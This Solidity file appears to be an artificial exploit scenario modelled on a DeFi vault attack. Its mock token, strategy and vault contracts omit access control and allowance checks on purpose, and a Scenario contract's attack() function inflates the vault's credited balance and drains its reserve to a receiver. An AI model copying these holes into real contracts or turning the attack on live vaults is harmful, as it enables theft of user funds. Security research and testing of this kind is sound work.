// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

contract FlamincomeUSDT { mapping(address=>uint256) public balanceOf; string public constant name="FlamincomeUSDT"; string public constant symbol="FlamincomeUSDT"; uint8 public constant decimals=18; function mint(address to,uint256 a) external{balanceOf[to]+=a;} function transfer(address to,uint256 a) external returns(bool){require(balanceOf[msg.sender]>=a,"balance");balanceOf[msg.sender]-=a;balanceOf[to]+=a;return true;} function transferFrom(address f,address t,uint256 a) external returns(bool){require(balanceOf[f]>=a,"balance");balanceOf[f]-=a;balanceOf[t]+=a;return true;} }


contract FlamincomeStrategy {
    FlamincomeUSDT public immutable asset;
    mapping(address=>uint256) public balanceOf;
    constructor(FlamincomeUSDT a){asset=a;}
    function stakeFor(address account,uint256 amount) external { balanceOf[account]+=amount; }
    function nav(address account) external view returns(uint256){ return asset.balanceOf(address(this))+balanceOf[account]; }
}
contract FlamincomeVaultYUSDT {
    FlamincomeUSDT public immutable asset; FlamincomeStrategy public immutable strategy; address public immutable beneficiary; uint256 public shares;
    constructor(FlamincomeUSDT a, FlamincomeStrategy s){asset=a;strategy=s;beneficiary=msg.sender; shares=1e18;}
    function redeem(address to) external { uint256 value=asset.balanceOf(address(this))+strategy.balanceOf(address(this)); shares=0; asset.transfer(to,value); }
}

contract Scenario {
    FlamincomeUSDT public asset; FlamincomeStrategy public strategy; FlamincomeVaultYUSDT public vault; address public immutable owner; uint256 public constant SEED=1_000_000 ether;
    constructor(){ owner=msg.sender; asset=new FlamincomeUSDT(); strategy=new FlamincomeStrategy(asset); vault=new FlamincomeVaultYUSDT(asset,strategy); asset.mint(address(vault),SEED); }
    function attack(address receiver) external { require(msg.sender==owner,"unauthorized"); strategy.stakeFor(address(vault),SEED/2); vault.redeem(receiver); }
    function reserveBalance() external view returns(uint256){return asset.balanceOf(address(vault));}
    function attackerBalance(address a) external view returns(uint256){return asset.balanceOf(a);}
    function assetAddress() external view returns(address){return address(asset);}
}

